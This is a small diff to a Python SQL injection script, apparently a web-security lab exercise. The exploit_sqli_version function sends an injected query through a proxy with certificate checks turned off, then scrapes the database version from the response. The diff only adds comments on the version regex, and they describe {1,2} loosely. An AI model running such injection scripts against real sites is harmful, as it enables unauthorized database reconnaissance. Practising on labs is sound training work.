@@ -19,7 +19,9 @@ def exploit_sqli_version(url):
     r = requests.get(url + path + sql_payload, verify=False, proxies=proxies)
     res = r.text
     soup = BeautifulSoup(res, 'html.parser')
-    version = soup.find(text=re.compile('.*\d{1,2}\.\d{1,2}\.\d{1,2}.*'))
+    version = soup.find(text=re.compile('.*\d{1,2}\.\d{1,2}\.\d{1,2}.*')) # our output will be 8.0.35 or 00.00.00 the number can be anything 
+    # so we need 2 digits after every point so we have used {1,2} it is for that reason 
+    
     if version is None:
         return False
     else:
